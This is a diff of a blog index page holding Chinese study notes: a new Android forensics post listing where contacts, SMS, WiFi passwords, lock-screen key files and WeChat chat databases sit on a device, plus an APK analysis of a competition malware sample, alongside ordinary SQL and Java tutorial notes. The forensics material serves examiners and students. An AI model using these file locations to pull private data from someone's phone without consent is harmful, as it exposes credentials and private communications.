@@ -64,6 +64,230 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-安卓取证" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/" class="article-date">
+  <time datetime="2023-11-01T00:14:01.000Z" itemprop="datePublished">2023-11-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/">安卓取证</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1><span id="目录">目录</span></h1><!-- toc -->
+
+<ul>
+<li><a href="#android%E5%88%86%E5%8C%BA%E7%BB%93%E6%9E%84">Android分区结构</a><ul>
+<li><a href="#system%E5%88%86%E5%8C%BA">system分区</a></li>
+<li><a href="#userdata%E5%88%86%E5%8C%BA">userdata分区</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90">取证分析</a><ul>
+<li><a href="#%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E7%97%95%E8%BF%B9">系统应用痕迹</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E7%97%95%E8%BF%B9">第三方应用痕迹</a><ul>
+<li><a href="#%E5%BE%AE%E4%BF%A1">微信</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#apk%E9%80%86%E5%90%91%E5%88%86%E6%9E%90">APK逆向分析</a><ul>
+<li><a href="#app%E7%94%B3%E8%AF%B7%E6%9D%83%E9%99%90">APP申请权限</a></li>
+<li><a href="#%E5%BA%94%E7%94%A8%E5%90%8D%E7%A7%B0">应用名称</a></li>
+<li><a href="#%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95">签名算法</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<p>[toc]</p>
+<h1><span id="android分区结构">Android分区结构</span></h1><h2><span id="system分区">system分区</span></h2><ul>
+<li>/system/app/：存放系统应用程序APK文件</li>
+<li>/system/lib/：存放应用程序用到的库文件</li>
+<li>/system/bin/和/system/xbin/：存储Linux命令程序</li>
+<li>/system/framework/：存储Android系统运行时所需的一些框架</li>
+<li>/system/etc/：存储一些配置文件</li>
+<li>/system/media/：存储的是一些媒体文件，如手机铃声、壁纸等。</li>
+</ul>
+<h2><span id="userdata分区">userdata分区</span></h2><ol>
+<li>/userdata/data/</li>
+</ol>
+<p>存放应用程序数据，以QQ为例，在/userdata/data/com.tencent.mobileqq/目录下存储着QQ相关的数据，如聊天记录的数据库文件</p>
+<ol start="2">
+<li><p>/userdata/media/0/</p>
+<ul>
+<li><p>/Android：主要存储的是一些普通文件</p>
+</li>
+<li><p>/DICM：存储的是手机拍摄的照片、手机截图等文件</p>
+</li>
+<li><p>/Download：存储的是手机下载的文件</p>
+</li>
+<li><p>/Pictures：存储除了<code>/DICM</code>以外的图片文件</p>
+</li>
+<li><p>/Tencent：存储QQ、微信等腾讯应用数据，例如微信中的一些图片文件。</p>
+</li>
+</ul>
+</li>
+<li><p>/userdata/system/</p>
+<ul>
+<li>/preinstall.list：该文件记录系统安装的应用程序</li>
+<li>/packages.list：该文件记录应用程序的安装位置</li>
+<li>/locksettings.db，gatekeeper.pattern.key，gatekeeper.pattern.key，device_policies.xml：这些文件是与锁屏密码相关的文件</li>
+</ul>
+</li>
+<li><p>/userdata/misc/</p>
+<p>该目录中存储的是与VPN、WiFi、KeyStore等相关的配置文件。</p>
+<ul>
+<li>wpa_supplicant.conf：文件记录了设备曾经连接的WiFi的SSID以及密码等信息</li>
+<li>p2p_supplicant.conf：文件记录了设备的WiFi热点名称及其他信息</li>
+</ul>
+</li>
+</ol>
+<h1><span id="取证分析">取证分析</span></h1><h2><span id="系统应用痕迹">系统应用痕迹</span></h2><ol>
+<li>系统基本信息<ul>
+<li>/system/build.prop：设备的版本、产品名称、CPU等信息</li>
+<li>/userdata/system/netpolicy.xml：时区信息</li>
+<li>/userdata/system/device_policies.xml：锁屏密码的要求和策略</li>
+<li>/userdata/system/gesture.key：手势密码文件</li>
+<li>/userdata/system/password.key：密码文件</li>
+<li>/userdata/data/com.android.provider/calendar/databases/calendar.db：日历等信息</li>
+</ul>
+</li>
+<li>联系人和通话记录<ul>
+<li>/userdata/data/com.android.providers.contacts/databases/contacts2.db：联系人信息</li>
+<li>/userdata/data/com.android.providers.contacts/databases/calllog.db：通话记录</li>
+</ul>
+</li>
+<li>短信信息<ul>
+<li>/userdata/data/com.android.providers.telephony/databases/</li>
+</ul>
+</li>
+</ol>
+<p>mmssms.db</p>
+<ol start="4">
+<li>WiFi信息<ul>
+<li>/userdata/misc/wifi/wpa_supplcant.conf：包含WiFi密码</li>
+<li>/userdata/misc/wifi/softtap.conf：手机热点密码</li>
+<li>/userdata/misc/wifi/WifiConfigStore.xml：无线网络信息</li>
+</ul>
+</li>
+<li>App安装信息<ul>
+<li>/userdata/system/packages.xml：应用程序权限</li>
+<li>/userdata/system/packages.list：应用程序权限和元数据</li>
+</ul>
+</li>
+</ol>
+<h2><span id="第三方应用痕迹">第三方应用痕迹</span></h2><h3><span id="微信">微信</span></h3><table>
+<thead>
+<tr>
+<th>路径</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/userdata/data/com.tencent.mm/MicroMsg/&lt;hash&gt;/EnMicroMsg.db</td>
+<td>存储微信聊天记录的数据库</td>
+</tr>
+</tbody></table>
+<h1><span id="apk逆向分析">APK逆向分析</span></h1><table>
+<thead>
+<tr>
+<th>目录</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>assets目录</td>
+<td>存储需要打包到APK中的静态文件</td>
+</tr>
+<tr>
+<td>lib目录</td>
+<td>程序依赖的原生库文件</td>
+</tr>
+<tr>
+<td>res目录</td>
+<td>应用程序的资源</td>
+</tr>
+<tr>
+<td>META-INF目录</td>
+<td>应用程序签名和证书目录</td>
+</tr>
+<tr>
+<td>AndroidMainifest.xml</td>
+<td>应用程序配置文件</td>
+</tr>
+<tr>
+<td>classes.dex</td>
+<td>dex可执行文件</td>
+</tr>
+<tr>
+<td>resources.arsc</td>
+<td>资源配置文件</td>
+</tr>
+</tbody></table>
+<p>以2021美亚杯考题中恶意软件”安心出行“为例</p>
+<p><img src="/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/image-20231101001436993.png" alt="image-20231101001436993"></p>
+<h3><span id="app申请权限">APP申请权限</span></h3><table>
+<thead>
+<tr>
+<th>android.permission.INTERNET</th>
+<th>该权限允许程序打开网络套接字</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>android.permission.ACCESS_NETWORK_STATE</td>
+<td>该权限允许程序访问有关GSM网络的信息</td>
+</tr>
+<tr>
+<td>android.permission.READ_CONTACTS</td>
+<td>该权限允许程序读取用户的联系人数据</td>
+</tr>
+<tr>
+<td>android.permission.READ_PHONE_STATE</td>
+<td>该权限允许程序访问电话状态</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>查看AndroidMainifest.xml文件</p>
+<p><img src="/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/image-20231101001906987.png" alt="image-20231101001906987"></p>
+<h3><span id="应用名称">应用名称</span></h3><table>
+<thead>
+<tr>
+<th>app_name</th>
+<th>应用名称</th>
+</tr>
+</thead>
+</table>
+<p><img src="/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/image-20231101003315138.png" alt="image-20231101003315138"></p>
+<h3><span id="签名算法">签名算法</span></h3><p><img src="/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/image-20231101003429132.png" alt="image-20231101003429132"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/" data-id="clofl765g0000z8vl3vkzg75q" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-数据库原理与安全" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/" class="article-date">
@@ -101,6 +325,7 @@
 <li><a href="#131-ddl">1.3.1、DDL</a></li>
 <li><a href="#132-dml">1.3.2、DML</a></li>
 <li><a href="#133-dql">1.3.3、DQL</a></li>
+<li><a href="#134-dcl">1.3.4、DCL</a></li>
 </ul>
 </li>
 <li><a href="#14-%E5%87%BD%E6%95%B0">1.4、函数</a><ul>
@@ -120,6 +345,25 @@
 <li><a href="#162-%E6%A6%82%E8%BF%B0">1.6.2、概述</a></li>
 <li><a href="#163-%E5%88%86%E7%B1%BB">1.6.3、分类</a></li>
 <li><a href="#164-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2">1.6.4、联合查询</a></li>
+<li><a href="#165-%E5%AD%90%E6%9F%A5%E8%AF%A2">1.6.5、子查询</a></li>
+</ul>
+</li>
+<li><a href="#17-%E8%A7%86%E5%9B%BE">1.7、视图</a><ul>
+<li><a href="#171-%E5%88%9B%E5%BB%BA-%E6%9F%A5%E8%AF%A2-%E4%BF%AE%E6%94%B9-%E5%88%A0%E9%99%A4">1.7.1、创建-查询-修改-删除</a></li>
+<li><a href="#172">1.7.2、</a></li>
+<li><a href="#173">1.7.3、</a></li>
+</ul>
+</li>
+<li><a href="#18-%E4%BA%8B%E5%8A%A1">1.8、事务</a><ul>
+<li><a href="#181-%E4%BA%8B%E5%8A%A1%E6%93%8D%E4%BD%9C">1.8.1、事务操作</a></li>
+<li><a href="#182-%E4%BA%8B%E5%8A%A1%E5%9B%9B%E5%A4%A7%E7%89%B9%E6%80%A7">1.8.2、事务四大特性</a></li>
+<li><a href="#183-%E5%B9%B6%E5%8F%91%E4%BA%8B%E5%8A%A1%E9%97%AE%E9%A2%98">1.8.3、并发事务问题</a></li>
+<li><a href="#184-%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB">1.8.4、事务隔离级别</a></li>
+</ul>
+</li>
+<li><a href="#19-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B">1.9、存储过程</a></li>
+<li><a href="#image-20230528203437499%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8image-20230528203437499png"><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528203437499.png" alt="image-20230528203437499"></a><ul>
+<li><a href="#191-%E5%8F%98%E9%87%8F">1.9.1、变量</a></li>
 </ul>
 </li>
 </ul>
@@ -242,11 +486,11 @@
 </li>
 <li><p>删除索引</p>
 <blockquote>
-<p>DROP INDEX 索引名</p>
+<p>DROP INDEX 索引名 ON 表名</p>
 </blockquote>
 </li>
 </ul>
-<h3><span id="132-dml">1.3.2、DML</span></h3><ul>
+<h3><span id="132-dml">1.3.2、DML</span></h3><h4><span id="插入数据">插入数据</span></h4><ul>
 <li><p>给指定的字段添加数据</p>
 <blockquote>
 <p>INSERT INTO 表名(字段1,字段2,…)</p>
@@ -271,9 +515,11 @@
 <p>​                (值1,值2,…);</p>
 </blockquote>
 <p><strong>注意</strong>：字符串和日期类型数据应该包含在引号中。</p>
-<h3><span id="133-dql">1.3.3、DQL</span></h3></li>
+</li>
 </ul>
-<h4><span id="语法结构">语法结构</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230521210020487.png" alt="image-20230521210020487"></p>
+<h4><span id="更新修改数据">更新/修改数据</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528155939447.png" alt="image-20230528155939447"></p>
+<h4><span id="删除">删除</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528160120983.png" alt="image-20230528160120983"></p>
+<h3><span id="133-dql">1.3.3、DQL</span></h3><h4><span id="语法结构">语法结构</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230521210020487.png" alt="image-20230521210020487"></p>
 <h4><span id="条件查询">条件查询</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230521210325208.png" alt="image-20230521210325208"></p>
 <h4><span id="分组查询">分组查询</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230521211207456.png" alt="image-20230521211207456"></p>
 <h4><span id="分页查询">分页查询</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230521211541799.png" alt="image-20230521211541799"></p>
@@ -284,6 +530,7 @@
 </blockquote>
 </li>
 </ul>
+<h3><span id="134-dcl">1.3.4、DCL</span></h3><p><strong>管理数据库用户，控制数据库的访问权限</strong></p>
 <h2><span id="14-函数">1.4、函数</span></h2><h3><span id="字符串函数">字符串函数</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230521212328321.png" alt="image-20230521212328321"></p>
 <h3><span id="数值函数">数值函数</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230521233803810.png" alt="image-20230521233803810"></p>
 <h3><span id="日期函数">日期函数</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230521234100420.png" alt="image-20230521234100420"></p>
@@ -300,9 +547,29 @@
 <h4><span id="1632-外连接">1.6.3.2、外连接</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522014112480.png" alt="image-20230522014112480"></p>
 <h4><span id="1633-自连接">1.6.3.3、自连接</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522014407570.png" alt="image-20230522014407570"></p>
 <h3><span id="164-联合查询">1.6.4、联合查询</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522015033933.png" alt="image-20230522015033933"></p>
-<pre><code>### 1.6.5、子查询
-</code></pre>
-<p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522015219401.png" alt="image-20230522015219401"></p>
+<h3><span id="165-子查询">1.6.5、子查询</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522015219401.png" alt="image-20230522015219401"></p>
+<h4><span id="1651-标量子查询">1.6.5.1、标量子查询</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522094421043.png" alt="image-20230522094421043"></p>
+<h4><span id="1652-列子查询">1.6.5.2、列子查询</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522094938797.png" alt="image-20230522094938797"></p>
+<h4><span id="1653-行子查询">1.6.5.3、行子查询</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522095327588.png" alt="image-20230522095327588"></p>
+<h4><span id="1654-表子查询">1.6.5.4、表子查询</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522095728433.png" alt="image-20230522095728433"></p>
+<h2><span id="17-视图">1.7、视图</span></h2><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522212128545.png" alt="image-20230522212128545"></p>
+<h3><span id="171-创建-查询-修改-删除">1.7.1、创建-查询-修改-删除</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230522212521862.png" alt="image-20230522212521862"></p>
+<h3><span id="172">1.7.2、</span></h3><h3><span id="173">1.7.3、</span></h3><h2><span id="18-事务">1.8、事务</span></h2><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230527141052905.png" alt="image-20230527141052905"></p>
+<h3><span id="181-事务操作">1.8.1、事务操作</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230527142443310.png" alt="image-20230527142443310"></p>
+<ul>
+<li>设置隐含事务方式的命令：</li>
+</ul>
+<blockquote>
+<p>SET IMPLICIT_TRANSACTIONS ON | OFF</p>
+</blockquote>
+<h3><span id="182-事务四大特性">1.8.2、事务四大特性</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230527143018370.png" alt="image-20230527143018370"></p>
+<h3><span id="183-并发事务问题">1.8.3、并发事务问题</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528141516505.png" alt="image-20230528141516505"></p>
+<h3><span id="184-事务隔离级别">1.8.4、事务隔离级别</span></h3><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528141911031.png" alt="image-20230528141911031"></p>
+<h2><span id="19-存储过程">1.9、存储过程</span></h2><p><strong>感觉类似函数或者方法</strong></p>
+<h2><span id><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528203437499.png" alt="image-20230528203437499"></span></h2><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528203617447.png" alt="image-20230528203617447"></p>
+<h3><span id="191-变量">1.9.1、变量</span></h3><h4><span id="系统变量">系统变量</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528204235096.png" alt="image-20230528204235096"></p>
+<h4><span id="用户定义变量">用户定义变量</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528204843287.png" alt="image-20230528204843287"></p>
+<h4><span id="局部变量">局部变量</span></h4><p><img src="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/image-20230528205036496.png" alt="image-20230528205036496"></p>
 
       
     </div>
@@ -349,6 +616,7 @@
 <li><a href="#for%E5%BE%AA%E7%8E%AF">for循环</a></li>
 <li><a href="#%E4%B8%BB%E6%96%B9%E6%B3%95">主方法</a></li>
 <li><a href="#%E8%87%AA%E5%8A%A8%E6%8A%BD%E5%8F%96%E6%96%B9%E6%B3%95">自动抽取方法</a></li>
+<li><a href="#%E5%8C%85%E8%A3%B9%E4%BB%A3%E7%A0%81">包裹代码</a></li>
 <li><a href="#%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90javabean%E7%B1%BB">自动生成JavaBean类</a></li>
 </ul>
 </li>
@@ -369,6 +637,7 @@
 <li><a href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a><ul>
 <li><a href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-1">基本数据类型</a></li>
 <li><a href="#%E5%BC%95%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">引用数据类型</a></li>
+<li><a href="#%E6%B3%9B%E5%9E%8B">泛型</a></li>
 </ul>
 </li>
 <li><a href="#%E5%BE%AA%E7%8E%AF">循环</a><ul>
@@ -381,23 +650,41 @@
 <li><a href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95">构造方法</a></li>
 </ul>
 </li>
-<li><a href="#%E5%AF%B9%E8%B1%A1">对象</a><ul>
+<li><a href="#java%E9%AB%98%E7%BA%A7%E7%89%B9%E5%BE%81">JAVA高级特征</a><ul>
 <li><a href="#%E7%B1%BB">类</a></li>
+<li><a href="#%E5%86%85%E9%83%A8%E7%B1%BB">内部类</a></li>
 <li><a href="#%E5%B0%81%E8%A3%85">封装</a></li>
+<li><a href="#%E7%BB%A7%E6%89%BF">继承</a></li>
+<li><a href="#%E5%A4%9A%E6%80%81">多态</a></li>
+<li><a href="#%E6%8E%A5%E5%8F%A3">接口</a></li>
+<li><a href="#%E6%8E%A5%E5%8F%A3%E5%92%8C%E7%B1%BB%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB">接口和类之间的关系</a></li>
 </ul>
 </li>
 <li><a href="#%E4%BF%AE%E9%A5%B0%E7%AC%A6">修饰符</a><ul>
 <li><a href="#private%E5%85%B3%E9%94%AE%E5%AD%97-%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7">private关键字–保证数据的安全性</a></li>
 <li><a href="#public%E5%85%B3%E9%94%AE%E5%AD%97">public关键字</a></li>
 <li><a href="#this%E5%85%B3%E9%94%AE%E5%AD%97">this关键字</a></li>
+<li><a href="#static">static</a></li>
+<li><a href="#final">final</a></li>
 </ul>
 </li>
+<li><a href="#%E5%8C%85">包</a></li>
 <li><a href="#%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86">内存管理</a><ul>
 <li><a href="#%E6%A0%88%E5%85%88%E8%BF%9B%E5%90%8E%E5%87%BA">· 栈：先进后出</a></li>
 <li><a href="#%E5%A0%86">· 堆：</a></li>
 <li><a href="#%E6%96%B9%E6%B3%95%E5%8C%BA%E5%85%83%E7%A9%BA%E9%97%B4">·方法区（元空间）</a></li>
 <li><a href="#%E6%9C%AC%E5%9C%B0%E6%96%B9%E6%B3%95%E6%A0%88">·本地方法栈</a></li>
 <li><a href="#%E5%AF%84%E5%AD%98%E5%99%A8">·寄存器</a></li>
+</ul>
+</li>
+<li><a href="#%E5%BC%82%E5%B8%B8">异常</a><ul>
+<li><a href="#%E6%8A%9B%E5%87%BA%E5%BC%82%E5%B8%B8">抛出异常</a></li>
+<li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8">自定义异常</a></li>
+</ul>
+</li>
+<li><a href="#file">File</a></li>
+<li><a href="#io%E6%B5%81">IO流</a><ul>
+<li><a href="#io%E6%B5%81%E4%BD%93%E7%B3%BB">IO流体系</a></li>
 </ul>
 </li>
 </ul>
@@ -420,6 +707,7 @@
 <li>ctrl+alt+m自动抽取方法</li>
 <li>替换</li>
 </ol>
+<h3><span id="包裹代码">包裹代码</span></h3><p>ctrl + alt + t</p>
 <h3><span id="自动生成javabean类">自动生成JavaBean类</span></h3><blockquote>
 <p>alt + insert</p>
 <p>or</p>
@@ -473,6 +761,13 @@
 <h3><span id="引用数据类型">引用数据类型</span></h3><p>除了基本数据类型的都是引用数据类型（<strong>数组是引用数据类型</strong>）</p>
 <p>引用数据类型在栈内存中开辟<strong>引用空间</strong>，引用空间<strong>存储指向堆内存的地址</strong>。</p>
 <p>特点：赋值给其他变量，赋的地址值</p>
+<p><strong>比较：基本数据类型比的是数据值，引用数据类型比的是地址值</strong></p>
+<h4><span id="字符串">字符串</span></h4><p><strong>字符串内容不可改变</strong></p>
+<p><img src="/2023/03/10/JAVA/image-20230530190506513.png" alt="image-20230530190506513"></p>
+<p><img src="/2023/03/10/JAVA/image-20230530191205017.png" alt="image-20230530191205017"></p>
+<p><img src="/2023/03/10/JAVA/image-20230530191336623.png" alt="image-20230530191336623"></p>
+<p><strong>拼接、反转字符串：StringBuilder</strong></p>
+<h5><span id="字符串原理">字符串原理</span></h5><p><img src="/2023/03/10/JAVA/image-20230530195312538.png" alt="image-20230530195312538"></p>
 <h4><span id="二维数组">二维数组</span></h4><h5><span id="1静态语法定义">1.静态语法定义:</span></h5><blockquote>
 <p>数据类型[][] 数组名 ={ {元素1，元素2}，{元素1，元素2} }</p>
 </blockquote>
@@ -485,8 +780,14 @@
 
 <h5><span id="3二维数组遍历">3.二维数组遍历</span></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr[i].length; j++) &#123;</span><br><span class="line">        System.out.print(arr[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">-------------------------</span><br><span class="line"><span class="comment">//增强for循环遍历</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] ints : arr) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> anInt : ints) &#123;</span><br><span class="line">        System.out.print(anInt + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-
+<h4><span id="集合">集合</span></h4><p><img src="/2023/03/10/JAVA/image-20230604200502703.png" alt="image-20230604200502703"></p>
+<p><img src="/2023/03/10/JAVA/image-20230604203731670.png" alt="image-20230604203731670"></p>
+<h3><span id="泛型">泛型</span></h3><p><img src="/2023/03/10/JAVA/image-20230613165651439.png" alt="image-20230613165651439"></p>
+<p><img src="/2023/03/10/JAVA/image-20230613165721962.png" alt="image-20230613165721962"></p>
+<h4><span id="泛型类">泛型类</span></h4><p><img src="/2023/03/10/JAVA/image-20230613165901567.png" alt="image-20230613165901567"></p>
+<h4><span id="泛型方法">泛型方法</span></h4><p><img src="/2023/03/10/JAVA/image-20230613171014843.png" alt="image-20230613171014843"></p>
+<p><img src="/2023/03/10/JAVA/image-20230613171034780.png" alt="image-20230613171034780"></p>
+<h4><span id="泛型接口">泛型接口</span></h4><p><img src="/2023/03/10/JAVA/image-20230613171418525.png" alt="image-20230613171418525"></p>
 <h2><span id="循环">循环</span></h2><h3><span id="增强for循环">增强for循环</span></h3><p>语法格式：</p>
 <blockquote>
 <p>for ( 变量类型 变量: 需迭代的数组或者集合)</p>
@@ -505,9 +806,10 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> class 类名&#123;</span><br><span class="line">    修饰符 类名（参数）&#123;</span><br><span class="line">        方法体；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 